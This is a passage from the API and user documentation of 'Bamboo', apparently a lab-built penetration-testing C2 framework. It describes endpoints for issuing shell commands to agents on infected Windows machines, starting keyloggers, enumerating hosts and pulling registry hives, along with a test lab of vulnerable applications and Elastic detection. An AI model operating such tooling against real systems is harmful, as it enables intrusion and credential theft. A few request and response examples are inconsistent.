\"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#modify-exploit-gui","title":"Modify Exploit (GUI)","text":"<p>Modifies exploit specified</p>"},{"location":"Teamserver/api_reference/exploit.html#endpoint_7","title":"Endpoint","text":"<pre><code>POST /exploit/modify_gui\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#description_7","title":"Description","text":"<p>Modify Exploit is called when GUI Bamboo Client calls the {<code>modify</code> command}. As Bamboo Client GUI will push all information to the Bamboo Teamserver no matter if they were modified, a new endpoint was created to cater to it. Similar to the previous Endpoint, if the name of the exploit to be modified changes its name, the exploit file name will change as well. Using the model modify_gui, the Bamboo Teamserver will be able to update the information of the exploit all together.</p>"},{"location":"Teamserver/api_reference/exploit.html#request-schema_7","title":"Request schema","text":"Request body Field Type Description username String Username of user modified_exploit_name String Name of exploit to modify new_name String New exploit name new_app_version String New app version new_LPE_start String New Privilege Escalation Start new_LPE_end String New Privilege Escalation End new_uac_bypass Boolean New uac_bypass requirement new_d2d Boolean New drop-to-disk requirement new_inj Boolean New injection requirement new_dropfile Boolean New dropfile requirement"},{"location":"Teamserver/api_reference/exploit.html#request-example_7","title":"Request example","text":"Request body <pre><code>{\n    \"username\": \"bambooUser\",\n    \"modified_exploit_name\": \"filmora.exe\",\n    \"new_name\": \"Panda.exe\",\n    \"modified_exploit_name\": \"for pandas\",\n    \"new_LPE_start\": \"admin\",\n    \"new_LPE_end\": \"system\",\n    \"new_uac_bypass\": true,\n    \"new_d2d\": true,\n    \"new_inj\": true,\n    \"new_dropfile\": \"Panda.exe\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/exploit.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/exploit.html#response-example_7","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html","title":"/handler_func","text":""},{"location":"Teamserver/api_reference/handler_func.html#display-agents","title":"Display Agents","text":"<p>Extract all Bamboo Agent information from database</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint","title":"Endpoint","text":"<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to view all current Bamboo Agents registered in the Bamboo Teamserver using the command <code>display</code>. Using the model show_agents and model get_heartbeat, the Bamboo Teamserver will be able to extract all register Bamboo Agents information and status from the database.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver/api_reference/handler_func.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent\": agent, \"heartbeat\": heartbeat} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent\": &lt;list of agent information&gt;,\n    \"heartbeat\": &lt;list of agent's heartbeat information&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#using-agents","title":"Using Agents","text":"<p>Extract specified agent information</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/use_agent\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_1","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start using a Bamboo Agent to interact with using the command <code>use [agent]</code>. Using the model use_agent, the Bamboo Teamserver will be able to identify if the Bamboo Agent specified exist. If it does, the data of that Bamboo Agent will be return.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_data\": agent_data} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#stop-using-agents","title":"Stop Using Agents","text":"<p>Stop using agents, for logging purposes</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/stop_agent\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_2","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to stop using a Bamboo Agent using the command <code>stop</code>. It is for logging purposes</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"stop\"} Success <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/handler_func.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#remove-agent","title":"Remove Agent","text":"<p>Remove specified Bamboo Agent</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/remove_agent\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_3","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a Bamboo Agent from the Bamboo Teamserver using the <code>delete [agent]</code>. Using the model remove_agent, the Bamboo Teamserver will delete all instances of the specified Bamboo Agent if it exist. Additionally, if the Bamboo Agent is still running, the Bamboo Teamserver will send a <code>kill</code> command to stop the Bamboo Agent.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_3","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Success <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#agent-information","title":"Agent Information","text":"<p>Retrieve a specific Bamboo Agent information</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_4","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to the Bamboo Agent in use information using the command <code>info</code>. Using the model info_status, the Bamboo Teamserver will be able to extract the information of the requested Bamboo Agent.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_4","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_4","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Retrieved information and Bamboo is 'alive' <code>200</code> {\"status\": \"dead\"} Retrieved information and Bamboo is 'dead' <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#view-all-users","title":"View all Users","text":"<p>Retrieve all users in Bamboo Teamserver</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_5","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to view all registered users in the Bamboo Teamserver using the <code>users</code>. Using the model view_users, the Bamboo Teamserver will be able to extract the username and status of the registered users.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_5","title":"Request schema","text":"Request body Field Type Description username String Username of user"},{"location":"Teamserver/api_reference/handler_func.html#request-example_5","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"user_data\": user_data} Successfully retrieved all registered user information <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"user_data\": &lt;list of usernames and status&gt;\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#add-new-users","title":"Add new Users","text":"<p>Register new users into the Bamboo Teamserver</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_6","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to register a new user into the Bamboo Teamserver using the <code>register</code>. Using the model find_one, the Bamboo Teamserver will be able to determine if there will be any duplicates of username. After that, it will use the model register_user to add the information of the new user into the database.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_6","title":"Request schema","text":"Request body Field Type Description username String Username of user new_username String New user username new_password String New user password"},{"location":"Teamserver/api_reference/handler_func.html#request-example_6","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"new_username\": \"bambooUserTwo\",\n    \"new_password\": \"ilovePandas213\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully registered a new user <code>404</code> {\"status\": \"fail\"} Invalid Body <code>422</code> {\"status\": \"duplicate\"} Username already exist <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_6","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#remove-users","title":"Remove Users","text":"<p>Remove Bamboo Client users from the Bamboo Teamserver</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_7","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_7","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a user from the Bamboo Teamserver using the <code>remove [username]</code>. Using the model delete_user, the Bamboo Teamserver will be able to delete the specified user.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_7","title":"Request schema","text":"Request body Field Type Description username String Username of user del_username String Username to remove"},{"location":"Teamserver/api_reference/handler_func.html#request-example_7","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"del_username\": \"bambooUserTwo\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted information of specified username <code>404</code> {\"status\": \"fail\"} Username not found <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"Teamserver/api_reference/handler_func.html#response-example_7","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#command-prompt","title":"Command Prompt","text":"<p>Sends commands to Bamboo Agent</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_8","title":"Endpoint","text":"<pre><code>POST /handler_func/cmd\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_8","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start a shell session with a Bamboo Agent using the <code>cmd</code>. The Bamboo Teamserver will use WebSocket to broadcast the command to the specified Bamboo Agent.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_8","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent command String Command to forward to Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_8","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"command\": \"whoami\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_8","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"Teamserver/api_reference/handler_func.html#response-example_8","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description command String cmd cmd String Command that Bamboo Client user input"},{"location":"Teamserver/api_reference/handler_func.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"cmd\",\n    \"cmd\": \"whoami\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#command-output","title":"Command Output","text":"<p>Receives response from Bamboo Agent during command</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_9","title":"Endpoint","text":"<pre><code>POST /handler_func/handler_output\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_9","title":"Description","text":"<p>After the Bamboo Client sends a command over to a Bamboo Agent using the <code>cmd</code>, the Bamboo Client will request for this endpoint and wait for a response. To prevent users from waiting indefinitely, there is a timeout mechanism. For every second in the first 10 seconds, the Bamboo Teamserver will check if the command response has been sent. If none have been sent, the user will get timed out.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_9","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/api_reference/handler_func.html#request-example_9","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_9","title":"Response schema","text":"Status Code Schema Description <code>200</code> {agent_identifier: response} Receive response <code>404</code> {\"status\": \"fail\"} Invalid Body <code>408</code> {\"status\": \"timeout\"} User timeout"},{"location":"Teamserver/api_reference/handler_func.html#response-example_9","title":"Response example","text":"<pre><code>{\n    \"5zrire9a\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#teamchat","title":"Teamchat","text":"<p>Broadcast teamchat message to all other Bamboo Client</p>"},{"location":"Teamserver/api_reference/handler_func.html#endpoint_10","title":"Endpoint","text":"<pre><code>POST /handler_func/teamchat\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#description_10","title":"Description","text":"<p>This endpoint is called every time a Bamboo Client user sends a message in the Teamchat using the <code>chat</code> in CLI or using the <code>TEAMCHAT tab</code> in GUI. The Bamboo Teamserver will relay the message from the Bamboo Client to all Bamboo Client using WebSocket broadcast.</p>"},{"location":"Teamserver/api_reference/handler_func.html#request-schema_10","title":"Request schema","text":"Request body Field Type Description username String Username of user message String Message sent into teamchat"},{"location":"Teamserver/api_reference/handler_func.html#request-example_10","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"message\": \"hello everyone\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#response-schema_10","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully broadcast command to Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body"},{"location":"Teamserver/api_reference/handler_func.html#response-example_10","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/handler_func.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description chatMsg String Bamboo Client Message"},{"location":"Teamserver/api_reference/handler_func.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"chatMsg\": \"hello everyone\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/overview.html","title":"Overview","text":""},{"location":"Teamserver/api_reference/overview.html#introduction","title":"Introduction","text":"<p>This section documents the Teamserver's endpoints. One of the main forms of communication that the Teamserver uses is Hypertext Transfer Protocol Secure (HTTPS). By using flask, blueprint, and flask_jwt_extended library for Secure Sockets Layer (SSL) and JSON Web Token (JWT), this ensures that all data exchanged between clients and the server is encrypted and secure, protecting sensitive information from unauthorized access. </p> <p>Flask Blueprint allows related APIs to be grouped together in the same file, under a common prefix. Flask flask_jwt_extended on the other hand provides an easy and secure way to handle JSON Web Tokens (JWTs) for authentication and authorization.</p>"},{"location":"Teamserver/api_reference/overview.html#base-url","title":"Base URL","text":"<p><pre><code>https://[teamserver_ip]:[port]\n</code></pre> For example, if your teamserver is hosted locally on port 4000, your base URL would be</p> <pre><code>https://127.0.0.1:4000\n</code></pre>"},{"location":"Teamserver/api_reference/overview.html#list-of-endpoints","title":"List of Endpoints","text":"<p>The table below shows the list of all RESTful APIs in the Bamboo Teamserver, which can be found in the file /teamserver/api.</p> Endpoint Description POST /agent/heartbeat For agent to ping at regular intervals to indicate that it is alive POST /agent/initial_connection/register For agent to register initial connection POST /agent/agent_response For agent to send back the response of a command POST /download/&lt;filename&gt; For agent to download a file from server GET /auth/ For clients to check if server is online POST /auth/login For user to log in to the server POST /auth/logout For user to log out of server POST /auth/check_agent_status To check an agent\u2019s status (dead, alive) POST /exploit/quit For user to exit the [exploit] command POST /exploit/send_config For user to send configurations for an exploit when using the [exploit] command POST /exploit/view_all For user to view all exploits in the database using the [exp] command POST /exploit/add For user to add exploits using the [add] command POST /exploit/delete For user to delete exploits using the [delete] command POST /exploit/exist To check if exploit exists POST /exploit/modify For user to modify an existing exploit in the database POST /handler_func/agent/display For user to view all agents using the [display] command POST /handler_func/use_agent For user to use an agent POST /handler_func/stop_agent For user to stop using an agent POST /handler_func/remove_agent For user to remove an agent from database POST /handler_func/handler/info_status For user to check the status of an agent POST /handler_func/handler/view_users For user to view all users in database POST /handler_func/handler/register_user For user to register a new user POST /handler_func/handler/delete_user For user to delete a user POST /handler_func/cmd For user to send commands to an agent to run in the target\u2019s terminal POST /handler_func/handler_output For user to print the response of a command from the agent POST /handler_func/teamchat For user to send a message to teamchat <p>There are a total of 5 prefixes used in the Bamboo Teamserver with the flask blueprint library for all HTTPS APIs. All of the prefixes are organised together as they are for easier management.</p> Prefix Description Examples /auth For authentication and status related /login, /check_agent_status /agent Only for Bamboo Agent to request /heartbeat, /post_exploit/keylog /handler_func For Bamboo Client to request, does not involve Bamboo Agent /agent/display, /handler/delete_user /exploit For exploit related /send_config, /delete /postexp For post exploit related /keylog, /retrieve"},{"location":"Teamserver/api_reference/postexp.html","title":"/postexp","text":""},{"location":"Teamserver/api_reference/postexp.html#keylogging","title":"Keylogging","text":"<p>Start/Stop keylogging activity of specified Bamboo Agent</p>"},{"location":"Teamserver/api_reference/postexp.html#endpoint","title":"Endpoint","text":"<pre><code>POST /postexp/keylog\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#description","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to start/stop keylogging activity. All activities will be recorded down into a <code>global variable: keylog_status</code>. keylog_status is a dictionary that keeps track of all keylog activity within Bamboo Teamserver. Therefore, with this global variable, the Bamboo Teamserver will be able to tell if the Bamboo Client user is starting or stopping the keylogging. After the Bamboo Teamserver knows the action to command, a WebSocket broadcast will be made to the Bamboo Agent Specified. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"Teamserver/api_reference/postexp.html#request-schema","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (keylog)"},{"location":"Teamserver/api_reference/postexp.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"keylog\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"action\": status} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/postexp.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"action\": \"start\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded status String To start/stop keylogging"},{"location":"Teamserver/api_reference/postexp.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"keylog\",\n    \"handler\": \"bambooUser\",\n    \"status\": \"start\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#enumeration","title":"Enumeration","text":"<p>Start enumerating an infected machine</p>"},{"location":"Teamserver/api_reference/postexp.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /postexp/enum\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#description_1","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to enumerate the infected machine remotely using the specified Bamboo Agent. The Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start enumerate the infected machine. This command can be called by any Bamboo Agent with any privilege level.</p>"},{"location":"Teamserver/api_reference/postexp.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate)"},{"location":"Teamserver/api_reference/postexp.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/postexp.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#websocket-schema_1","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"Teamserver/api_reference/postexp.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"enumerate\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#sss_retrieve","title":"SSS_Retrieve","text":"<p>Retrieve registry hive of infected machine</p>"},{"location":"Teamserver/api_reference/postexp.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /postexp/retrieve\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#description_2","title":"Description","text":"<p>Bamboo Client calls this endpoint when they want to retrieve the registry hive of the infected machine remotely using the specified Bamboo Agent. This command can only be called by Bamboo Agent with <code>High</code> or <code>System</code> level privilege. If the requirements are met, the Bamboo teamserver will send a WebSocket broadcast to the Bamboo Agent specified and command it to start retrieving the registry hive of the infected machine.</p>"},{"location":"Teamserver/api_reference/postexp.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent method String Tool used (enumerate) priv_lvl String Privilege level of Bamboo Agent"},{"location":"Teamserver/api_reference/postexp.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"method\": \"enum\",\n    \"priv_lvl\": \"System\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully command Bamboo Agent <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"Teamserver/api_reference/postexp.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/api_reference/postexp.html#websocket-schema_2","title":"WebSocket schema","text":"Websocket body Field Type Description command String post exploit method String Keylogging handler String User that commanded"},{"location":"Teamserver/api_reference/postexp.html#websocket-example_2","title":"WebSocket example","text":"<pre><code>{\n    \"command\": \"post exploit\",\n    \"method\": \"sss retrieve\",\n    \"handler\": \"bambooUser\"\n}\n</code></pre>"},{"location":"User%20Guide/prerequisites.html","title":"Recommended Setup","text":"<p>As Bamboo is a penetration testing C2 Framework, it will require multiple systems to be set up and connected. In order to fully experience the functions of Bamboo, the following setup is recommended.</p>"},{"location":"User%20Guide/prerequisites.html#systems-required","title":"Systems Required","text":"<ol> <li>Attacker Machine: Linux (Kali is recommended)<ul> <li>Install the Bamboo Teamserver</li> <li>Run the Bamboo Client</li> </ul> </li> <li>Target: Windows 11 machine<ul> <li>Microsoft Visual C++ Redistributables must be installed<ul> <li>After building the Bamboo Agent, the agent file must be placed in the Desktop folder of the target</li> </ul> </li> </ul> </li> <li>Elastic Stack Host: <ul> <li>The Elastic Stack can be deployed by following this guide by Elastic. <ul> <li>Installing the Elastic Defend and Windows integrations to ensure maximum detection capabilities.</li> <li>Enable the Malware Protection setting in the your Elastic agent policy. The detection level can be set to \"Detect\" so you can view the detections as alerts instead of just having the malicious file disappear.</li> </ul> </li> </ul> </li> </ol> <p>For testing purposes, these can be hosted as Virtual Machines using a software to run VMs such as VMWare Workstation or VirtualBox.</p> <p></p>"},{"location":"User%20Guide/prerequisites.html#vulnerable-application-installers","title":"Vulnerable Application Installers","text":"<p>The target machine will be a Windows 11 machine and the Bamboo Agent should be located in the Desktop folder. If you wish to use the pre-loaded exploits in Bamboo, download the following applications on the target:</p> Application Download link Description Microsoft Visual C++ redistributables (x86) https://aka.ms/vs/17/release/vc_redist.x86.exe For NtQueue injection Wondershare Filmora https://drive.google.com/file/d/1_Y2tvYV5k76dFDIKTdaH1ULfNQB-ccHT/view For Wondershare Filmora vulnerable application Wacom Driver https://cdn.wacom.com/u/productsupport/drivers/win/professional/WacomTablet_6.3.45-1.exe For Wacom Driver vulnerable application BarracudaDrive https://download.cnet.com/barracudadrive/3001-18506_4-10723210.html For BarracudaDrive vulnerable application Wondershare Dr Fone https://filehippo.com/download_wondershare-drfone-android/history/ For DrFone vulnerable application <p>There should also be a Windows machine, which is the target or otherwise, that can be used to build the Go agent (and transfer to the target machine).</p>"},{"location":"User%20Guide/using_bamboo_client.html","title":"Using Bamboo Client","text":""},{"location":"User%20Guide/using_bamboo_client.html#running-gui","title":"Running GUI","text":"<p>You can run the Bamboo Client on the same machine as the Teamserver with the command:</p> <p><pre><code>python handler_gui.py\n</code></pre> When starting the client, the first window to appear is the connection window. </p> <p></p> <p>Enter in the IP address and port the Teamserver is running on and press \"Connect\". If successful, you will be brought to the login window.</p> <p></p> <p>Enter your username and password and press \"Login\" to authenticate with the Teamserver. When successful, you will be brought to the main menu. </p> <p>The Teamserver IP, port number, and login username fields will be saved across sessions. </p>"},{"location":"User%20Guide/using_bamboo_client.html#main-menu","title":"Main Menu","text":"<p>(1) Menu Bar \u2013 Provides easy access to display and manage resources on the server. The tabs in the Menu Bar are as follows:</p> <ul> <li>BAMBOO \u2013 Display the Bamboo icon on the Display panel</li> <li>Display Agents \u2014 Allow the user to see the Bamboo Agents connected to the Teamserver in the Display Table. </li> <li>Users \u2013 Display users stored in the Teamserver\u2019s database or bring up a window to add a new user account.</li> <li>Exploits \u2013 Display exploits stored in the Teamserver\u2019s or bring up a window to add an exploit. </li> <li>View files \u2013 Opens the File Manager application for the folders that stores the results of post-exploitation functions or system enumeration</li> <li>Help</li> </ul> <p>(2) Display panel \u2013 Displays information selected from the Menu Bar in a table format. The table comes with a dropdown to remove specific items from the database or disconnect agents </p> <p></p> <p>(3) Websocket Messages \u2013 